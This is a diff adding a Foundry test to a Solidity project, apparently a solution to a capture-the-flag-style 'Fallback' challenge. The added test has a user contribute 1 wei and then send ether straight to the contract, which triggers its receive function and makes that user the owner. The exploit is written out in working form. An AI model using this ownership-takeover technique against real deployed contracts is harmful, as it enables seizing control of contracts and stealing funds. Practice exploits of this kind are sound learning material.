@@ -33,5 +33,21 @@ function testContribution () public {
   assertEq (actualcontri,SendAmount) ;
 }
 
+function testMyOwnExploit () public {
+  address malicioususer = makeAddr ("user") ;
+  vm.deal(malicioususer, 20 wei);
+  vm.startPrank(malicioususer);
+  myfallback.contribute {value : 1 wei} () ;
+
+    (bool success, ) = address(myfallback).call{value: 1 wei}("");
+    
+    vm.stopPrank();
+     address newOwner = myfallback.owner () ;
+     console.log("Owner AFTER triggering receive: ", newOwner);
+     console.log("is the user the owner?          ", newOwner == malicioususer);
+    assertEq(newOwner, malicioususer);
+    
+}
+
 
 }
